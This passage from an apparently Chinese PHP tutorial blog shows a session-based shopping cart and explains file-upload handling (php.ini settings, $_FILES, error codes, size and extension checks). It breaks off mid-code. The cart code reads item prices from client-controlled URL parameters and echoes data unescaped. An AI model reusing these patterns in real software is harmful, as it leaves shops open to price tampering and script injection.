<p>&amp;emsp;<br><strong>首先建立数据库信息：</strong><br>建立名为test的数据库，库中有个shop表，表结构有3个字段：<br>id  int(10)<br>name  varchar(20)<br>price  varchar(20)</p>
<p>&amp;emsp;<br>goodsList.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$goods</span> = <span class="keyword">array</span>();</span><br><span class="line">   <span class="comment">//从数据库获取商品信息存入$goods二维数组</span></span><br><span class="line">   <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">   <span class="comment">//这里请换上自己的数据库相关信息</span></span><br><span class="line">   <span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">   <span class="variable">$res</span> = mysqli_query(<span class="variable">$conn</span>,<span class="string">&#x27;select * from shop&#x27;</span>);</span><br><span class="line">   <span class="comment">//这里把商品信息放到$goods二维数组，每一维存的是单个</span></span><br><span class="line">   <span class="comment">//商品的信息，比如商品名、价格。</span></span><br><span class="line">   <span class="keyword">while</span> (<span class="variable">$row</span> = mysqli_fetch_assoc(<span class="variable">$res</span>)) &#123;</span><br><span class="line">       <span class="variable">$goods</span>[<span class="variable">$i</span>][<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">       <span class="variable">$goods</span>[<span class="variable">$i</span>][<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">       <span class="variable">$goods</span>[<span class="variable">$i</span>][<span class="string">&#x27;price&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line">       <span class="variable">$i</span>++ ;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   <span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//取出商品信息显示在页面上，并添加购买功能</span></span><br><span class="line">       <span class="keyword">foreach</span> (<span class="variable">$goods</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27; 商品名 &#x27;</span> . <span class="variable">$value</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27; 价格 &#x27;</span> . <span class="variable">$value</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=buy.php?name=&quot;</span> . <span class="variable">$value</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;&amp;price=&#x27;</span> . <span class="variable">$value</span>[<span class="string">&#x27;price&#x27;</span>] .<span class="string">&quot;&gt;购买&lt;/a&gt;&quot;</span>;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">?&gt;</span></span><br><span class="line">   &lt;a href=<span class="string">&quot;shoppingCart.php&quot;</span>&gt;查看购物车&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>buy.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//开启session</span></span><br><span class="line">   session_start();</span><br><span class="line"></span><br><span class="line">   <span class="comment">//获取传过来的商品名和价格</span></span><br><span class="line">   <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">   <span class="variable">$price</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">//把session中的商品信息和传过来的(刚买的)商品信息对比</span></span><br><span class="line">   <span class="variable">$goods</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;goods&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$name</span> == <span class="variable">$goods</span>[<span class="variable">$name</span>][<span class="string">&#x27;name&#x27;</span>]) &#123;</span><br><span class="line">       <span class="comment">//买过的话，则总价格增加，相应商品数量增加</span></span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;totalPrice&#x27;</span>] += <span class="variable">$price</span>;</span><br><span class="line">       <span class="variable">$goods</span>[<span class="variable">$name</span>][<span class="string">&#x27;number&#x27;</span>] += <span class="number">1</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="comment">//第一次买的话，将相应的商品信息添加到session中</span></span><br><span class="line">       <span class="variable">$goods</span>[<span class="variable">$name</span>][<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$name</span>;</span><br><span class="line">       <span class="variable">$goods</span>[<span class="variable">$name</span>][<span class="string">&#x27;price&#x27;</span>] = <span class="variable">$price</span>;</span><br><span class="line">       <span class="variable">$goods</span>[<span class="variable">$name</span>][<span class="string">&#x27;number&#x27;</span>] += <span class="number">1</span>;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;totalPrice&#x27;</span>] += <span class="variable">$price</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&#x27;goods&#x27;</span>] = <span class="variable">$goods</span>;</span><br><span class="line">   <span class="comment">//购买处理完毕后跳转到商品列表</span></span><br><span class="line">   header(<span class="string">&#x27;location: goodsList.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>shoppingCart.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//将session中的商品信息(即购物车中的商品)和总价显示到页面</span></span><br><span class="line"><span class="variable">$goods</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;goods&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;您买了:&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$goods</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$value</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27; 价格 &#x27;</span> . <span class="variable">$value</span>[<span class="string">&#x27;price&#x27;</span>] . <span class="string">&#x27; 数量 &#x27;</span> . <span class="variable">$value</span>[<span class="string">&#x27;number&#x27;</span>] . <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;总价：&#x27;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;totalPrice&#x27;</span>] . <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">&quot;goodsList.php&quot;</span>&gt;返回商品列表&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>效果图如下：</p>
<p><img data-src="https://i.loli.net/2019/02/26/5c7522ea3d61f.png" alt="1"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-文件上传</title>
    <url>/post/PHP-Upload/</url>
    <content><![CDATA[<p>(。・∀・)ノ</p>
<span id="more"></span>

<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 文件上传</font></center>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一-修改php-ini文件"><a href="#一-修改php-ini文件" class="headerlink" title="一. 修改php.ini文件"></a><font color="#FF6347" face="Comic sans MS">一. 修改php.ini文件</font></h3><p>一般情况需要修改：[可以使用ctrl+f 搜索相关配置项。]</p>
<table>
<thead>
<tr>
<th align="center">配置项</th>
<th align="left">功能说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file_uploads</td>
<td align="left">on为开启文件上传功能，off为关闭</td>
</tr>
<tr>
<td align="center">post_max_size</td>
<td align="left">系统允许的POST传参的最大值</td>
</tr>
<tr>
<td align="center">upload_max_filesize</td>
<td align="left">系统允许的上传文件的最大值</td>
</tr>
<tr>
<td align="center">memory_limit</td>
<td align="left">内存使用限制</td>
</tr>
<tr>
<td align="center">max_execution_time</td>
<td align="left">(1)脚本执行时间,参数的单位为秒。<br>(2)这个参数是设定脚本的最大执行时间。<br>(3)也可以根据需求做适当的改变。通常不需要来修改，系统默认值即可。超大文件<br>上传的时候，可能会涉及到这一项参数的修改。<br>(4)上传时间太长了，会超时。如果你将此项参数设为0，则是不限制超时时间，不建<br>议使用。</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>建议尺寸：</strong></font> file_size(文件大小) &lt; upload_max_filesize &lt; post_max_size &lt; memory_limit</p>
</blockquote>
<p> &amp;emsp;<br>&amp;emsp;</p>
<h3 id="三-is-uploaded-file-函数、数组-FILES"><a href="#三-is-uploaded-file-函数、数组-FILES" class="headerlink" title="三. is_uploaded_file()函数、数组$_FILES"></a><font color="#FF6347" face="Comic sans MS">三. is_uploaded_file()函数、数组$_FILES</font></h3><h4 id="2-1-创建一个文件上传表单"><a href="#2-1-创建一个文件上传表单" class="headerlink" title="2.1 创建一个文件上传表单"></a><font color="#3CB371" face="Comic sans MS">2.1 创建一个文件上传表单</font></h4><p>请看下面这个供上传文件的 HTML 表单：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<blockquote>
<p><font color="#FF7F00"><strong>请留意如下有关此表单的信息：</strong></font></p>
</blockquote>
<ol>
<li><strong>&lt;’&#39;form&gt; 标签的 enctype 属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，请使用 <font color="#FF7F00">“multipart&#x2F;form-data”</font>。</strong></li>
<li><strong>&lt;’&#39;input&gt; 标签的 <font color="#FF7F00">type&#x3D;”file”</font> 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。</strong></li>
</ol>
<p>&amp;emsp;</p>
<h4 id="2-2-is-uploaded-file-函数"><a href="#2-2-is-uploaded-file-函数" class="headerlink" title="2.2 is_uploaded_file() 函数"></a><font color="#3CB371" face="Comic sans MS">2.2 is_uploaded_file() 函数</font></h4><p><font color="#00B2EE">[<a href="http://www.runoob.com/php/func-filesystem-is-uploaded-file.html">PHP is_uploaded_file() 函数</a>]</font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：</strong></font>检查指定的文件是否是通过 <strong>HTTP POST</strong> 上传的。如果文件是通过 HTTP POST 上传的，该函数返回 TRUE。</p>
</blockquote>
<p><strong>语法： is_uploaded_file(file)</strong></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file</td>
<td align="left">必需。规定要检查的文件。</td>
</tr>
</tbody></table>
<p><strong>注意：</strong>该函数的结果会被缓存。请使用 <strong>clearstatcache()</strong> 来清除缓存。</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&quot;<span class="subst">$file</span> is uploaded via HTTP POST&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&quot;<span class="subst">$file</span> is not uploaded via HTTP POST&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">上面的代码将输出：</span><br><span class="line"></span><br><span class="line">test.txt is not uploaded via HTTP POST</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="2-3-FILES-数组"><a href="#2-3-FILES-数组" class="headerlink" title="2.3  $_FILES 数组"></a><font color="#3CB371" face="Comic sans MS">2.3  $_FILES 数组</font></h4><p>当客户端上传文件后，我们在action&#x3D;”xxxx.php”的xxxx.php页面就获得了一个**$_FILES 数组 。**<br><font color="#FF7F00"><strong>$_FILES 数组内容如下:</strong> </font></p>
<table>
<thead>
<tr>
<th align="center">数组元素</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$_FILES[“File”][“name”]</td>
<td align="left">上传文件的名称。</td>
</tr>
<tr>
<td align="center">$_FILES[“File”][“type”]</td>
<td align="left">文件的 MIME 类型，需要浏览器提供该信息的支持，例如”image&#x2F;gif”。</td>
</tr>
<tr>
<td align="center">$_FILES[“File”][“size”]</td>
<td align="left">已上传文件的大小，单位为字节。</td>
</tr>
<tr>
<td align="center">$_FILES[“File’][“tmp_name”]</td>
<td align="left">文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在ph<br>p.ini的upload_tmp_dir 指定，但 用 putenv()函数设置是不起作用的。</td>
</tr>
<tr>
<td align="center">$_FILES[“File”][“error”]</td>
<td align="left">和该文件上传相关的错误代码。[“error”] 是在 PHP 4.2.0 版本中增加的。<br>下面是它的说明：(它们在PHP3.0以后成了常量或0123467)</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>$_FILES数组结构：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//var_dump()或print_r()</span></span><br><span class="line"><span class="comment">//打印变量的相关信息,将变量的信息详细的展示出来</span></span><br><span class="line">var_dump(<span class="variable">$_FILES</span>);             </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">打印出来的结果的数组结构如下：</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span> =&gt; </span><br><span class="line">       <span class="keyword">array</span> (size=<span class="number">5</span>)</span><br><span class="line">       <span class="comment">//文件名</span></span><br><span class="line">      <span class="string">&#x27;name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;psu.jpg&#x27;</span> (length=<span class="number">7</span>) </span><br><span class="line">      <span class="comment">//文件的mime类型</span></span><br><span class="line">      <span class="string">&#x27;type&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;image/jpeg&#x27;</span> (length=<span class="number">10</span>)                    </span><br><span class="line">      <span class="comment">//缓存文件，上传的图片即保存在这里</span></span><br><span class="line">      <span class="string">&#x27;tmp_name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;E:\wamp\tmp\phpC32A.tmp&#x27;</span> (length=<span class="number">23</span>)</span><br><span class="line">      <span class="comment">//错误码，详见上面错误码介绍</span></span><br><span class="line">      <span class="string">&#x27;error&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">0</span>                                             </span><br><span class="line">      <span class="comment">//上传的文件大小</span></span><br><span class="line">      <span class="string">&#x27;size&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">225824</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="2-4-move-uploaded-file-函数"><a href="#2-4-move-uploaded-file-函数" class="headerlink" title="2.4  move_uploaded_file() 函数"></a><font color="#3CB371" face="Comic sans MS">2.4  move_uploaded_file() 函数</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_move_uploaded_file.asp">PHP move_uploaded_file() 函数</a>]</font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：</strong></font>将上传的文件移动到新位置，并命名。</p>
</blockquote>
<p><strong>bool</strong> <font color="#00B2EE"><strong>move_uploaded_file ( file, newloc)</strong></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file</td>
<td align="left">必需。规定要移动的文件。上传后的临时文件名，由系统自动生成。</td>
</tr>
<tr>
<td align="center">newloc</td>
<td align="left">必需。规定文件的新位置。包含有路径的新的文件名。</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font></p>
</blockquote>
<ol>
<li><strong>参数file一般为$_FILES[“File’][“tmp_name”]，</strong><font color="#FF7F00"><strong>是一个文件完整的临时路径和文件名；</strong></li>
<li><strong>参数newloc为新的路径，</strong><font color="#FF7F00"><strong>并且还要加上相应的重新命名文件的的格式。</strong></font></li>
<li><strong>本函数仅用于通过 HTTP POST 上传的文件。</strong></li>
<li>本函数检查并确保由 file 指定的文件<strong>是合法的上传文件</strong>（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。</li>
<li><font color="#FF7F00"><strong>返回值：</strong></font>如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。<br>如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。<br>这种检查显得格外重要，如果上传的文件有可能会造成对用户或本系统的其他用户显示其内容的话。</li>
<li>move_uploaded_file()基本上与函数<font color="#FF7F00">rename()</font>相同，<strong>但是它只能用于通过PHP的上传机制上传的文件</strong>。这是一项安全功能，可防止用户欺骗您的脚本，向他们显示与安全相关的数据。</li>
</ol>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三-文件上传的步骤"><a href="#三-文件上传的步骤" class="headerlink" title="三. 文件上传的步骤"></a><font color="#FF6347" face="Comic sans MS">三. 文件上传的步骤</font></h3><h4 id="3-1-判断是否有错误码"><a href="#3-1-判断是否有错误码" class="headerlink" title="3.1 判断是否有错误码"></a><font color="#3CB371" face="Comic sans MS">3.1 判断是否有错误码</font></h4><p>使用数组元素：<font color=red><strong>$_FILES[‘file’][‘error’]</strong></font><br>即判断<font color="#FF7F00">$_FILES[‘file’][‘error’]返回值！！</font><br>注：错误码中没有5。</p>
<table>
<thead>
<tr>
<th align="center">错误码<br>对应常量</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0<br>UPLOAD_ERR_OK</td>
<td align="left">无误，可以继续进行文件上传的后续操作。</td>
</tr>
<tr>
<td align="center">1<br>UPLOAD_ERR_INI_SIZE</td>
<td align="left">超出上传文件的最大限制，upload_max_filesize &#x3D; 2M php.ini中设置，一<br>般默认为2M。可根据项目中的实际需要来修改</td>
</tr>
<tr>
<td align="center">2<br>UPLOAD_ERR_FORM_SIZE</td>
<td align="left">超出了指定的文件大小,根据项目的业务需求指定上传文件的大小限制</td>
</tr>
<tr>
<td align="center">3<br>UPLOAD_ERR_PARTIAL</td>
<td align="left">只有部分文件被上传</td>
</tr>
<tr>
<td align="center">4<br>UPLOAD_ERR_NO_FILE</td>
<td align="left">文件没有被上传</td>
</tr>
<tr>
<td align="center">6</td>
<td align="left">找不到临时文件夹，可能目录不存在或没权限</td>
</tr>
<tr>
<td align="center">7</td>
<td align="left">文件写入失败，可能磁盘满了或没有权限</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">   <span class="keyword">switch</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]) &#123;    <span class="comment">//错误码不为0，即文件上传过程中出现了错误</span></span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;文件过大&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;文件超出指定大小&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;只有部分文件被上传&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;文件没有被上传&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;找不到指定文件夹&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;文件写入失败&#x27;</span>;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">default</span>:</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;上传出错&lt;br/&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="comment">//错误码为0，即上传成功，可以进行后续处理，处理流程见下文</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-2-判断是否超出文件大小范围"><a href="#3-2-判断是否超出文件大小范围" class="headerlink" title="3.2 判断是否超出文件大小范围"></a><font color="#3CB371" face="Comic sans MS">3.2 判断是否超出文件大小范围</font></h4><p>使用数组元素：<font color=red><strong>$_FILES[“File’][“size”]</strong></font></p>
<p>&amp;emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//判断错误</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//有错误可停止执行</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//当前上传文件无误，运行本段代码</span></span><br><span class="line">    <span class="comment">//判断文件是否超出了指定的大小</span></span><br><span class="line">    <span class="comment">//单位为byte</span></span><br><span class="line">    <span class="variable">$MAX_FILE_SIZE</span> = <span class="number">100000</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="variable">$MAX_FILE_SIZE</span>) &#123;</span><br><span class="line">        <span class="comment">//判断，如果上传的文件，大小超出了我们给的限制范围，退上传并产生错误提示</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;文件超出指定大小&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>将我们指定的文件大小，定义为$MAX_FILE_SIZE，该变量的计数单位为byte，对应上传文件的 $_FILES[‘file’][‘size’]大小。<br>示例代码中，限制大小约为100K及以下的文件。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-3-判断后缀名和mime类型是否符合"><a href="#3-3-判断后缀名和mime类型是否符合" class="headerlink" title="3.3 判断后缀名和mime类型是否符合"></a><font color="#3CB371" face="Comic sans MS">3.3 判断后缀名和mime类型是否符合</font></h4><p>使用数组元素：<font color=red><strong>$_FILES[“File”][“type”]</strong></font></p>
<blockquote>
<ol>
<li><strong>MIME</strong>(Multipurpose Internet Mail Extensions)是多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</li>
<li>在判断后缀和MIME类型的时候，我们会<font color="#FF7F00">用到PHP的一个函数<strong>in_array()</strong></font>,该函数传入两个参数。<br>第一个参数是要判断的值；<br>第二个参数是范围数组。<br>我们用这个函数来判断文件的后缀名和mime类型是否在允许的范围内。</li>
</ol>
</blockquote>
<p>&amp;emsp;<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*判断后缀名和MIME类型是否符合指定需求</span></span><br><span class="line"><span class="comment">例如:</span></span><br><span class="line"><span class="comment">当前项目指定上传后缀为.jpg或.gif的图片，则$allowSuffix = array(&#x27;jpg&#x27;,&#x27;gif&#x27;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//定义允许的后缀名数组</span></span><br><span class="line"><span class="variable">$myImg</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">explode() 将一个字符串用指定的字符切割，并返回一个数组，这里我们将文件名用&#x27;.&#x27;&#x27;切割,结果存在$myImg</span></span><br><span class="line"><span class="comment">中，文件的后缀名即为数组的最后一个值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$myImgSuffix</span> = array_pop(<span class="variable">$myImg</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">根据上传文件名获取文件的后缀名</span></span><br><span class="line"><span class="comment">使用in_array()函数，判断上传文件是否符合要求</span></span><br><span class="line"><span class="comment">当文件后缀名不在我们允许的范围内时退出上传并返回错误信息</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$myImgSuffix</span>, <span class="variable">$allowSuffix</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;文件后缀名不符&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">mime类型和文件后缀名的对应关系，我们可以通过很多途径查询到，为了避免用户自主修改文件后缀名造成文件无</span></span><br><span class="line"><span class="comment">法使用。</span></span><br><span class="line"><span class="comment">mime类型也必须做出限制检查mime类型，是为了防止上传者直接修改文件后缀名</span></span><br><span class="line"><span 